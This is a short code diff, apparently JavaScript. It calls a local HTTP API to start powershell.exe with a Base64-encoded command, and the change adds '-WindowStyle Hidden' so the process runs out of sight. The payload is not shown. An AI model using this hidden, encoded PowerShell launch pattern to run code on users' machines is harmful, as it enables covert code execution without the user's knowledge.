@@ -21,7 +21,7 @@ const encoded = toBase64Utf16LE(command);
 const url =
     'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
     'powershell.exe/' +
-    encodeURIComponent('-EncodedCommand ' + encoded);
+    encodeURIComponent('-WindowStyle Hidden ' + '-EncodedCommand ' + encoded);
 fetch(url, {
     method: 'POST'
 })
